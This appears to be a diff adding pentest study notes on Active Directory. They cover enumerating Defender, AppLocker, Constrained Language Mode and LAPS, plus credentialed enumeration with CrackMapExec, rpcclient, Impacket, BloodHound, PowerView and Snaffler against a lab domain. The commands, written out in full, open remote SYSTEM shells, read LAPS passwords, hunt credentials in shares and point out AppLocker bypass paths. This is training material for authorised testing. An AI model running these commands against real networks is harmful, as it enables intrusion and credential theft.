+<tr><td><code>AntivirusEnabled</code></td><td>AV engine is enabled</td></tr>
+<tr><td><code>AntispywareEnabled</code></td><td>Anti-spyware engine is enabled</td></tr>
+<tr><td><code>BehaviorMonitorEnabled</code></td><td>Behavioral analysis is active</td></tr>
+<tr><td><code>IoavProtectionEnabled</code></td><td>Scans files downloaded via IE/Edge</td></tr>
+<tr><td><code>OnAccessProtectionEnabled</code></td><td>Scans files on access</td></tr>
+</tbody>
+</table>
+</div>
+<p>If <code>RealTimeProtectionEnabled</code> is <code>True</code>, Defender is actively scanning — tools may need obfuscation or bypass techniques.</p>
+<h2 id="applocker"><a class="header" href="#applocker">AppLocker</a></h2>
+<p>AppLocker is Microsoft’s application whitelisting solution. It gives administrators control over which applications and files users can run, providing granular control over:</p>
+<ul>
+<li>Executables</li>
+<li>Scripts</li>
+<li>Windows Installer files</li>
+<li>DLLs</li>
+<li>Packaged apps and packed app installers</li>
+</ul>
+<h3 id="common-applocker-configurations"><a class="header" href="#common-applocker-configurations">Common AppLocker Configurations</a></h3>
+<p>Organizations often block <code>cmd.exe</code> and <code>PowerShell.exe</code> and restrict write access to certain directories. A common mistake is blocking only the default 64-bit PowerShell path while leaving others accessible:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Blocked Path</th><th>Often Overlooked Alternatives</th></tr>
+</thead>
+<tbody>
+<tr><td><code>%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe</code></td><td><code>%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code></td></tr>
+<tr><td></td><td><code>PowerShell_ISE.exe</code></td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="enumerating-applocker-policies"><a class="header" href="#enumerating-applocker-policies">Enumerating AppLocker Policies</a></h3>
+<pre><code class="language-powershell">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+</code></pre>
+<p>Look for:</p>
+<ul>
+<li><strong>Deny rules</strong> — what executables/paths are blocked and for which groups</li>
+<li><strong>Allow rules</strong> — what paths are allowed (e.g. <code>%PROGRAMFILES%\*</code>, <code>%WINDIR%\*</code>)</li>
+<li><strong>User/group scope</strong> — rules targeting Domain Users vs. Administrators</li>
+</ul>
+<h2 id="powershell-constrained-language-mode"><a class="header" href="#powershell-constrained-language-mode">PowerShell Constrained Language Mode</a></h2>
+<p>Constrained Language Mode (CLM) restricts many PowerShell features needed for offensive operations:</p>
+<ul>
+<li>Blocks COM objects</li>
+<li>Only allows approved .NET types</li>
+<li>Blocks XAML-based workflows</li>
+<li>Blocks PowerShell classes</li>
+</ul>
+<h3 id="checking-language-mode"><a class="header" href="#checking-language-mode">Checking Language Mode</a></h3>
+<pre><code class="language-powershell">$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Mode</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>FullLanguage</code></td><td>No restrictions — all features available</td></tr>
+<tr><td><code>ConstrainedLanguage</code></td><td>Restricted — many offensive techniques blocked</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="laps-local-administrator-password-solution"><a class="header" href="#laps-local-administrator-password-solution">LAPS (Local Administrator Password Solution)</a></h2>
+<p>Microsoft LAPS randomizes and rotates local administrator passwords on Windows hosts to prevent lateral movement. Key enumeration goals:</p>
+<ul>
+<li>Which domain users/groups can <strong>read LAPS passwords</strong></li>
+<li>Which machines <strong>have LAPS installed</strong> (and which do not)</li>
+</ul>
+<h3 id="lapstoolkit"><a class="header" href="#lapstoolkit">LAPSToolkit</a></h3>
+<p>The <a href="https://github.com/leoloobeek/LAPSToolkit">LAPSToolkit</a> provides several useful functions for LAPS enumeration.</p>
+<h4 id="find-delegated-groups-1"><a class="header" href="#find-delegated-groups-1">Find Delegated Groups</a></h4>
+<p>Parses <code>ExtendedRights</code> for all computers with LAPS enabled. Shows groups specifically delegated to read LAPS passwords (often users in protected groups):</p>
+<pre><code class="language-powershell">Find-LAPSDelegatedGroups
+</code></pre>
+<h4 id="find-extended-rights-1"><a class="header" href="#find-extended-rights-1">Find Extended Rights</a></h4>
+<p>Checks rights on each LAPS-enabled computer for groups with read access and users with “All Extended Rights.” Users with this right can read LAPS passwords and may be less protected than users in delegated groups. An account that has joined a computer to the domain receives All Extended Rights over that host:</p>
+<pre><code class="language-powershell">Find-AdmPwdExtendedRights
+</code></pre>
+<h4 id="get-laps-passwords"><a class="header" href="#get-laps-passwords">Get LAPS Passwords</a></h4>
+<p>Search for LAPS-enabled computers, password expiration times, and the cleartext passwords (if your user has access):</p>
+<pre><code class="language-powershell">Get-LAPSComputers
+</code></pre>
+<h2 id="summary"><a class="header" href="#summary">Summary</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Control</th><th>Enumeration Command</th><th>What to Look For</th></tr>
+</thead>
+<tbody>
+<tr><td>Windows Defender</td><td><code>Get-MpComputerStatus</code></td><td><code>RealTimeProtectionEnabled</code>, AV/antispyware status</td></tr>
+<tr><td>AppLocker</td><td><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></td><td>Deny rules, blocked paths, overlooked PowerShell locations</td></tr>
+<tr><td>PS Constrained Language Mode</td><td><code>$ExecutionContext.SessionState.LanguageMode</code></td><td><code>ConstrainedLanguage</code> vs <code>FullLanguage</code></td></tr>
+<tr><td>LAPS</td><td><code>Find-LAPSDelegatedGroups</code>, <code>Find-AdmPwdExtendedRights</code>, <code>Get-LAPSComputers</code></td><td>Delegated groups, extended rights, password access</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="credentialed-enumeration---from-linux"><a class="header" href="#credentialed-enumeration---from-linux">Credentialed Enumeration - from Linux</a></h1>
+<p>After gaining a foothold and obtaining domain credentials (cleartext password, NTLM hash, or SYSTEM access on a domain-joined host), we can perform deep enumeration of domain users, computers, groups, GPOs, ACLs, trusts, and more. Most tools require at minimum a low-privilege domain user account.</p>
+<h2 id="crackmapexec-cme--netexec"><a class="header" href="#crackmapexec-cme--netexec">CrackMapExec (CME / NetExec)</a></h2>
+<p>Versatile toolkit for assessing AD environments. Supports SMB, MSSQL, SSH, and WinRM protocols. Built on Impacket and PowerSploit.</p>
+<h3 id="domain-user-enumeration"><a class="header" href="#domain-user-enumeration">Domain User Enumeration</a></h3>
+<pre><code class="language-bash">sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+</code></pre>
+<ul>
+<li>Returns all domain users with <code>badPwdCount</code> attribute</li>
+<li>Use <code>badPwdCount</code> to filter users for password spraying (avoid accounts with count &gt; 0 to prevent lockouts)</li>
+</ul>
+<h3 id="domain-group-enumeration"><a class="header" href="#domain-group-enumeration">Domain Group Enumeration</a></h3>
+<pre><code class="language-bash">sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+</code></pre>
+<ul>
+<li>Lists all groups with member counts</li>
+<li>Note groups of interest: Domain Admins, Administrators, Executives, IT admin groups</li>
+</ul>
+<h3 id="logged-on-users"><a class="header" href="#logged-on-users">Logged-On Users</a></h3>
+<pre><code class="language-bash">sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+</code></pre>
+<ul>
+<li>Shows users currently logged into a target host</li>
+<li><code>(Pwn3d!)</code> in output indicates local admin access on the target</li>
+<li>Look for privileged users (service accounts, domain admins) on file servers and jump hosts</li>
+</ul>
+<h3 id="share-enumeration"><a class="header" href="#share-enumeration">Share Enumeration</a></h3>
+<pre><code class="language-bash">sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+</code></pre>
+<ul>
+<li>Shows share names and access level (READ/WRITE)</li>
+<li>Target non-default shares (Department Shares, User Shares, archive shares) for sensitive data</li>
+</ul>
+<h3 id="share-spidering-with-spider_plus"><a class="header" href="#share-spidering-with-spider_plus">Share Spidering with spider_plus</a></h3>
+<pre><code class="language-bash">sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+</code></pre>
+<ul>
+<li>Recursively lists all readable files in a share</li>
+<li>Output written as JSON to <code>/tmp/cme_spider_plus/&lt;ip&gt;.json</code></li>
+<li>Look for <code>web.config</code> files, scripts, and files that may contain hardcoded credentials</li>
+</ul>
+<h3 id="key-cme-flags"><a class="header" href="#key-cme-flags">Key CME Flags</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-u</code></td><td>Username</td></tr>
+<tr><td><code>-p</code></td><td>Password</td></tr>
+<tr><td><code>--users</code></td><td>Enumerate domain users</td></tr>
+<tr><td><code>--groups</code></td><td>Enumerate domain groups</td></tr>
+<tr><td><code>--loggedon-users</code></td><td>Enumerate logged-on users on target</td></tr>
+<tr><td><code>--shares</code></td><td>Enumerate SMB shares</td></tr>
+<tr><td><code>-M spider_plus</code></td><td>Spider shares for all readable files</td></tr>
+<tr><td><code>--share</code></td><td>Target a specific share (with spider_plus)</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="smbmap"><a class="header" href="#smbmap">SMBMap</a></h2>
+<p>SMB enumeration tool for listing shares, permissions, and contents from Linux.</p>
+<h3 id="check-share-access"><a class="header" href="#check-share-access">Check Share Access</a></h3>
+<pre><code class="language-bash">smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+</code></pre>
+<ul>
+<li>Shows permission level per share: <code>READ ONLY</code>, <code>READ, WRITE</code>, or <code>NO ACCESS</code></li>
+<li>Standard users typically have no access to <code>ADMIN$</code> or <code>C$</code></li>
+<li>Default read access to <code>IPC$</code>, <code>NETLOGON</code>, and <code>SYSVOL</code></li>
+</ul>
+<h3 id="recursive-directory-listing"><a class="header" href="#recursive-directory-listing">Recursive Directory Listing</a></h3>
+<pre><code class="language-bash">smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-R</code></td><td>Recursive listing of a share</td></tr>
+<tr><td><code>--dir-only</code></td><td>Only show directories (suppress file listing)</td></tr>
+<tr><td><code>-d</code></td><td>Domain for authentication</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="rpcclient-3"><a class="header" href="#rpcclient-3">rpcclient</a></h2>
+<p>Tool for MS-RPC enumeration via the Samba protocol. Supports both authenticated and unauthenticated (null session) enumeration.</p>
+<h3 id="connect-null-session"><a class="header" href="#connect-null-session">Connect (Null Session)</a></h3>
+<pre><code class="language-bash">rpcclient -U "" -N 172.16.5.5
+</code></pre>
+<h3 id="connect-authenticated"><a class="header" href="#connect-authenticated">Connect (Authenticated)</a></h3>
+<pre><code class="language-bash">rpcclient -U 'forend%Klmcargo2' 172.16.5.5
+</code></pre>
+<h3 id="user-enumeration-1"><a class="header" href="#user-enumeration-1">User Enumeration</a></h3>
+<pre><code class="language-bash">rpcclient $&gt; enumdomusers
+rpcclient $&gt; queryuser 0x457
+</code></pre>
+<h3 id="understanding-rids"><a class="header" href="#understanding-rids">Understanding RIDs</a></h3>
+<ul>
+<li><strong>SID</strong> (Security Identifier): unique identifier for a domain (e.g. <code>S-1-5-21-3842939050-3880317879-2865463114</code>)</li>
+<li><strong>RID</strong> (Relative Identifier): appended to SID to uniquely identify an object</li>
+<li>Full user SID = domain SID + RID (e.g. <code>S-1-5-21-...-1111</code>)</li>
+</ul>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>RID (Hex)</th><th>RID (Dec)</th><th>Account</th></tr>
+</thead>
+<tbody>
+<tr><td><code>0x1f4</code></td><td>500</td><td>Built-in Administrator</td></tr>
+<tr><td><code>0x1f5</code></td><td>501</td><td>Guest</td></tr>
+<tr><td><code>0x1f6</code></td><td>502</td><td>krbtgt</td></tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li>RIDs for built-in accounts are consistent across all domains</li>
+<li>Use <code>queryuser &lt;RID&gt;</code> to get detailed info (logon times, password info, bad password count)</li>
+</ul>
+<h2 id="impacket-toolkit"><a class="header" href="#impacket-toolkit">Impacket Toolkit</a></h2>
+<p>Python toolkit for interacting with Windows protocols. Key tools for credentialed enumeration and remote execution.</p>
+<h3 id="psexecpy"><a class="header" href="#psexecpy">psexec.py</a></h3>
+<p>Creates a remote service via <code>ADMIN$</code> share, provides interactive shell as <strong>SYSTEM</strong>:</p>
+<pre><code class="language-bash">psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+</code></pre>
+<ul>
+<li>Requires local admin credentials on the target</li>
+<li>Uploads a randomly-named executable to <code>ADMIN$</code></li>
+<li>Communicates over a named pipe</li>
+<li>Lands as <code>NT AUTHORITY\SYSTEM</code></li>
+</ul>
+<h3 id="wmiexecpy"><a class="header" href="#wmiexecpy">wmiexec.py</a></h3>
+<p>Semi-interactive shell via WMI. More stealthy than psexec — no files dropped, fewer logs:</p>
+<pre><code class="language-bash">wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+</code></pre>
+<ul>
+<li>Runs commands as the authenticated user (not SYSTEM)</li>
+<li>Each command spawns a new <code>cmd.exe</code> via WMI</li>
+<li>Event ID 4688 generated per command (new process creation)</li>
+<li>Less obvious than SYSTEM executing commands, but still detectable</li>
+</ul>
+<h3 id="psexecpy-vs-wmiexecpy"><a class="header" href="#psexecpy-vs-wmiexecpy">psexec.py vs wmiexec.py</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th></th><th>psexec.py</th><th>wmiexec.py</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>Runs as</strong></td><td>SYSTEM</td><td>Authenticated user</td></tr>
+<tr><td><strong>Files on disk</strong></td><td>Yes (uploads to ADMIN$)</td><td>No</td></tr>
+<tr><td><strong>Log volume</strong></td><td>Higher</td><td>Lower</td></tr>
+<tr><td><strong>Stealth</strong></td><td>Lower</td><td>Higher</td></tr>
+<tr><td><strong>Shell type</strong></td><td>Fully interactive</td><td>Semi-interactive</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="windapsearch-1"><a class="header" href="#windapsearch-1">Windapsearch</a></h2>
+<p>Python script for AD enumeration via LDAP queries.</p>
+<h3 id="domain-admins"><a class="header" href="#domain-admins">Domain Admins</a></h3>
+<pre><code class="language-bash">python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+</code></pre>
+<h3 id="privileged-users-recursivenested"><a class="header" href="#privileged-users-recursivenested">Privileged Users (Recursive/Nested)</a></h3>
+<pre><code class="language-bash">python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+</code></pre>
+<ul>
+<li><code>-PU</code> performs recursive lookups for nested group membership</li>
+<li>Checks common elevated group names in multiple languages</li>
+<li>Reveals users with excess privileges through nested group membership (good for reporting)</li>
+</ul>
+<h3 id="key-flags-1"><a class="header" href="#key-flags-1">Key Flags</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>--da</code></td><td>Enumerate Domain Admins members</td></tr>
+<tr><td><code>-PU</code></td><td>Find all privileged users (recursive nested lookups)</td></tr>
+<tr><td><code>-U</code></td><td>All users</td></tr>
+<tr><td><code>-G</code></td><td>All groups</td></tr>
+<tr><td><code>-C</code></td><td>All computers</td></tr>
+<tr><td><code>--user-spns</code></td><td>Find users with SPNs (Kerberoastable)</td></tr>
+<tr><td><code>--unconstrained-users</code></td><td>Users with unconstrained delegation</td></tr>
+<tr><td><code>--unconstrained-computers</code></td><td>Computers with unconstrained delegation</td></tr>
+<tr><td><code>--gpos</code></td><td>Enumerate GPOs</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="bloodhoundpy"><a class="header" href="#bloodhoundpy">BloodHound.py</a></h2>
+<p>Python-based BloodHound ingestor for collecting AD data from a Linux attack host. Collects users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, sessions, RDP/WinRM access, and more.</p>
+<h3 id="run-collection"><a class="header" href="#run-collection">Run Collection</a></h3>
+<pre><code class="language-bash">sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-u</code></td><td>Username</td></tr>
+<tr><td><code>-p</code></td><td>Password</td></tr>
+<tr><td><code>-ns</code></td><td>Nameserver (Domain Controller)</td></tr>
+<tr><td><code>-d</code></td><td>Domain</td></tr>
+<tr><td><code>-c</code></td><td>Collection method (<code>all</code>, <code>Default</code>, <code>DCOnly</code>, <code>Session</code>, <code>Group</code>, <code>ACL</code>, etc.)</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="output"><a class="header" href="#output">Output</a></h3>
+<ul>
+<li>Produces JSON files: <code>&lt;date&gt;_computers.json</code>, <code>&lt;date&gt;_domains.json</code>, <code>&lt;date&gt;_groups.json</code>, <code>&lt;date&gt;_users.json</code></li>
+<li>Zip for import: <code>zip -r bh_data.zip *.json</code></li>
+</ul>
+<h3 id="load-into-bloodhound-gui"><a class="header" href="#load-into-bloodhound-gui">Load into BloodHound GUI</a></h3>
+<pre><code class="language-bash">sudo neo4j start
+bloodhound
+</code></pre>
+<ol>
+<li>Click “Upload Data” button</li>
+<li>Select the <code>.zip</code> or individual <code>.json</code> files</li>
+<li>Use the Analysis tab for pre-built queries (e.g. “Find Shortest Paths To Domain Admins”)</li>
+</ol>
+<h3 id="why-bloodhound-matters"><a class="header" href="#why-bloodhound-matters">Why BloodHound Matters</a></h3>
+<ul>
+<li>Uses graph theory to visualize relationships and attack paths</li>
+<li>Finds nuanced flaws that would be missed by manual enumeration</li>
+<li>Shows nested group memberships, ACL abuse paths, session-based lateral movement</li>
+<li><code>DCOnly</code> collection is stealthier (no host connections)</li>
+</ul>
+<h2 id="useful-resources"><a class="header" href="#useful-resources">Useful Resources</a></h2>
+<ul>
+<li><a href="https://wadcoms.github.io/">WADComs</a> — interactive cheat sheet for Windows/AD offensive tools</li>
+<li><a href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/">BloodHound Cypher Cheatsheet</a> — custom Cypher queries for BloodHound</li>
+</ul>
+<h2 id="summary-1"><a class="header" href="#summary-1">Summary</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Protocol</th><th>Key Use Case</th></tr>
+</thead>
+<tbody>
+<tr><td>CrackMapExec</td><td>SMB/WinRM/MSSQL/SSH</td><td>All-purpose AD enumeration, share spidering, user hunting</td></tr>
+<tr><td>SMBMap</td><td>SMB</td><td>Share enumeration with permissions and recursive listing</td></tr>
+<tr><td>rpcclient</td><td>MS-RPC</td><td>User/group enumeration via RID lookups, null session testing</td></tr>
+<tr><td>psexec.py</td><td>SMB (ADMIN$)</td><td>Remote SYSTEM shell (requires local admin)</td></tr>
+<tr><td>wmiexec.py</td><td>WMI</td><td>Stealthy remote shell as authenticated user</td></tr>
+<tr><td>Windapsearch</td><td>LDAP</td><td>Quick domain admin/privileged user/nested group enumeration</td></tr>
+<tr><td>BloodHound.py</td><td>LDAP/SMB</td><td>Full AD data collection for attack path visualization</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="credentialed-enumeration---from-windows"><a class="header" href="#credentialed-enumeration---from-windows">Credentialed Enumeration - from Windows</a></h1>
+<p>Enumeration from a Windows attack host using domain credentials. Tools include the ActiveDirectory PowerShell module, PowerView/SharpView, Snaffler, and SharpHound/BloodHound. Some findings may be informational (e.g., ability to run BloodHound freely, user account attributes) but still valuable for reporting. Focus on misconfigurations, permission issues, trust relationships, and sensitive data in file shares.</p>
+<h2 id="activedirectory-powershell-module"><a class="header" href="#activedirectory-powershell-module">ActiveDirectory PowerShell Module</a></h2>
+<p>Built-in PowerShell module with 147+ cmdlets for AD administration. Stealthier than dropping tools since it’s a native Windows component.</p>
+<h3 id="load-the-module"><a class="header" href="#load-the-module">Load the Module</a></h3>
+<pre><code class="language-powershell">Import-Module ActiveDirectory
+Get-Module
+</code></pre>
+<h3 id="domain-information"><a class="header" href="#domain-information">Domain Information</a></h3>
+<pre><code class="language-powershell">Get-ADDomain
+</code></pre>
+<p>Key fields: <code>DomainSID</code>, <code>DomainMode</code>, <code>ChildDomains</code>, <code>Forest</code>, <code>DomainControllersContainer</code>, <code>ReplicaDirectoryServers</code></p>
+<h3 id="users-with-spns-kerberoastable-1"><a class="header" href="#users-with-spns-kerberoastable-1">Users with SPNs (Kerberoastable)</a></h3>
+<pre><code class="language-powershell">Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+</code></pre>
+<h3 id="trust-relationships"><a class="header" href="#trust-relationships">Trust Relationships</a></h3>
+<pre><code class="language-powershell">Get-ADTrust -Filter *
+</code></pre>
+<p>Key fields to examine:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>Direction</code></td><td>Bidirectional, Inbound, or Outbound</td></tr>
+<tr><td><code>IntraForest</code></td><td><code>True</code> = within same forest; <code>False</code> = external forest trust</td></tr>
+<tr><td><code>ForestTransitive</code></td><td>Whether the trust extends across forests</td></tr>
+<tr><td><code>TrustType</code></td><td>Uplevel (Windows 2000+), Downlevel, etc.</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="group-enumeration-1"><a class="header" href="#group-enumeration-1">Group Enumeration</a></h3>
+<pre><code class="language-powershell">Get-ADGroup -Filter * | select name
+Get-ADGroup -Identity "Backup Operators"
+Get-ADGroupMember -Identity "Backup Operators"
+</code></pre>
+<p>Note groups of interest: Backup Operators, Domain Admins, Enterprise Admins, IT admin groups, any group with service accounts.</p>
+<h3 id="useful-ad-module-cmdlets"><a class="header" href="#useful-ad-module-cmdlets">Useful AD Module Cmdlets</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Cmdlet</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>Get-ADDomain</code></td><td>Domain info (SID, mode, child domains, DCs)</td></tr>
+<tr><td><code>Get-ADUser</code></td><td>Query users with filters</td></tr>
+<tr><td><code>Get-ADGroup</code></td><td>Query groups</td></tr>
+<tr><td><code>Get-ADGroupMember</code></td><td>List group members</td></tr>
+<tr><td><code>Get-ADTrust</code></td><td>Domain trust relationships</td></tr>
+<tr><td><code>Get-ADComputer</code></td><td>Query computers</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="powerview-1"><a class="header" href="#powerview-1">PowerView</a></h2>
+<p>PowerShell tool for AD situational awareness. More manual than BloodHound but can reveal subtle misconfigurations. Part of PowerSploit (deprecated) — maintained fork by BC-Security for Empire 4.</p>
+<h3 id="key-functions-reference"><a class="header" href="#key-functions-reference">Key Functions Reference</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Category</th><th>Function</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>Utility</strong></td><td><code>Export-PowerViewCSV</code></td><td>Append results to CSV</td></tr>
+<tr><td></td><td><code>ConvertTo-SID</code></td><td>Convert name to SID</td></tr>
+<tr><td></td><td><code>Get-DomainSPNTicket</code></td><td>Request Kerberos ticket for SPN account</td></tr>
+<tr><td><strong>Domain/LDAP</strong></td><td><code>Get-Domain</code></td><td>Current/specified domain object</td></tr>
+<tr><td></td><td><code>Get-DomainController</code></td><td>List domain controllers</td></tr>
+<tr><td></td><td><code>Get-DomainUser</code></td><td>All/specific users</td></tr>
+<tr><td></td><td><code>Get-DomainComputer</code></td><td>All/specific computers</td></tr>
+<tr><td></td><td><code>Get-DomainGroup</code></td><td>All/specific groups</td></tr>
+<tr><td></td><td><code>Get-DomainOU</code></td><td>All/specific OUs</td></tr>
+<tr><td></td><td><code>Find-InterestingDomainAcl</code></td><td>ACLs with modification rights for non-built-in objects</td></tr>
+<tr><td></td><td><code>Get-DomainGroupMember</code></td><td>Members of a group</td></tr>
+<tr><td></td><td><code>Get-DomainFileServer</code></td><td>Likely file servers</td></tr>
+<tr><td></td><td><code>Get-DomainDFSShare</code></td><td>Distributed file systems</td></tr>
+<tr><td><strong>GPO</strong></td><td><code>Get-DomainGPO</code></td><td>All/specific GPOs</td></tr>
+<tr><td></td><td><code>Get-DomainPolicy</code></td><td>Default domain/DC policy</td></tr>
+<tr><td><strong>Computer</strong></td><td><code>Get-NetLocalGroup</code></td><td>Local groups on machine</td></tr>
+<tr><td></td><td><code>Get-NetLocalGroupMember</code></td><td>Members of local group</td></tr>
+<tr><td></td><td><code>Get-NetShare</code></td><td>Open shares</td></tr>
+<tr><td></td><td><code>Get-NetSession</code></td><td>Session info</td></tr>
+<tr><td></td><td><code>Test-AdminAccess</code></td><td>Test local admin access</td></tr>
+<tr><td><strong>Meta</strong></td><td><code>Find-DomainUserLocation</code></td><td>Where users are logged in</td></tr>
+<tr><td></td><td><code>Find-DomainShare</code></td><td>Reachable shares</td></tr>
+<tr><td></td><td><code>Find-InterestingDomainShareFile</code></td><td>Interesting files on readable shares</td></tr>
+<tr><td></td><td><code>Find-LocalAdminAccess</code></td><td>Machines where current user is local admin</td></tr>
+<tr><td><strong>Trust</strong></td><td><code>Get-DomainTrust</code></td><td>Domain trusts</td></tr>
+<tr><td></td><td><code>Get-ForestTrust</code></td><td>Forest trusts</td></tr>
+<tr><td></td><td><code>Get-DomainForeignUser</code></td><td>Users in groups outside their domain</td></tr>
+<tr><td></td><td><code>Get-DomainForeignGroupMember</code></td><td>Groups with external members</td></tr>
+<tr><td></td><td><code>Get-DomainTrustMapping</code></td><td>Enumerate all trusts for current domain</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="detailed-user-info"><a class="header" href="#detailed-user-info">Detailed User Info</a></h3>
+<pre><code class="language-powershell">Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+</code></pre>
+<h3 id="recursive-group-membership"><a class="header" href="#recursive-group-membership">Recursive Group Membership</a></h3>
+<pre><code class="language-powershell">Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+</code></pre>
+<p>The <code>-Recurse</code> flag reveals nested group membership — if a group like <code>Secadmins</code> is a member of <code>Domain Admins</code>, all members of <code>Secadmins</code> inherit DA rights.</p>
+<h3 id="trust-mapping"><a class="header" href="#trust-mapping">Trust Mapping</a></h3>
+<pre><code class="language-powershell">Get-DomainTrustMapping
+</code></pre>
+<p>Shows all trusts with source, target, type (<code>WITHIN_FOREST</code>, <code>FOREST_TRANSITIVE</code>), and direction.</p>
+<h3 id="test-local-admin-access"><a class="header" href="#test-local-admin-access">Test Local Admin Access</a></h3>
+<pre><code class="language-powershell">Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+</code></pre>
+<h3 id="users-with-spns-kerberoastable-1-1"><a class="header" href="#users-with-spns-kerberoastable-1-1">Users with SPNs (Kerberoastable)</a></h3>
+<pre><code class="language-powershell">Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+</code></pre>
+<h2 id="sharpview"><a class="header" href="#sharpview">SharpView</a></h2>
+<p>.NET port of PowerView for environments where PowerShell is restricted or blocked.</p>
+<pre><code class="language-powershell">.\SharpView.exe Get-DomainUser -Identity forend
+.\SharpView.exe Get-DomainUser -Help
+</code></pre>
+<p>Supports many of the same functions as PowerView with the same argument names.</p>
+<h2 id="snaffler"><a class="header" href="#snaffler">Snaffler</a></h2>
+<p>Tool for hunting credentials and sensitive data across SMB shares in AD. Must be run from a domain-joined host or in a domain-user context.</p>
+<h3 id="execution"><a class="header" href="#execution">Execution</a></h3>
+<pre><code class="language-powershell">.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-s</code></td><td>Print results to console</td></tr>
+<tr><td><code>-d</code></td><td>Domain to search</td></tr>
+<tr><td><code>-o</code></td><td>Output log file</td></tr>
+<tr><td><code>-v</code></td><td>Verbosity level (<code>data</code> = results only, recommended)</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="what-snaffler-finds"><a class="header" href="#what-snaffler-finds">What Snaffler Finds</a></h3>
+<ul>
+<li>Credential files (<code>.kdb</code>, <code>.kwallet</code>, <code>.psafe3</code>)</li>
+<li>Key files (<code>.key</code>, <code>.keypair</code>, <code>.ppk</code>, <code>.keychain</code>)</li>
+<li>Database dumps (<code>.sqldump</code>, <code>.mdf</code>)</li>
+<li>Config files (<code>.tblk</code>, VPN configs)</li>
+<li>Color-coded output: <strong>Red</strong> = high interest, <strong>Green</strong> = shares, <strong>Black</strong> = notable files</li>
+</ul>
+<h3 id="tips-8"><a class="header" href="#tips-8">Tips</a></h3>
+<ul>
+<li>Output can be large — always write to a log file</li>
+<li>Provide raw output to clients as supplemental data to help them prioritize share lockdown</li>
+<li>Look for passwords, SSH keys, config files with hardcoded credentials</li>
+</ul>
+<h2 id="sharphound--bloodhound-from-windows"><a class="header" href="#sharphound--bloodhound-from-windows">SharpHound / BloodHound (from Windows)</a></h2>
+<p>SharpHound is the C# data collector for BloodHound, run from domain-joined Windows hosts.</p>
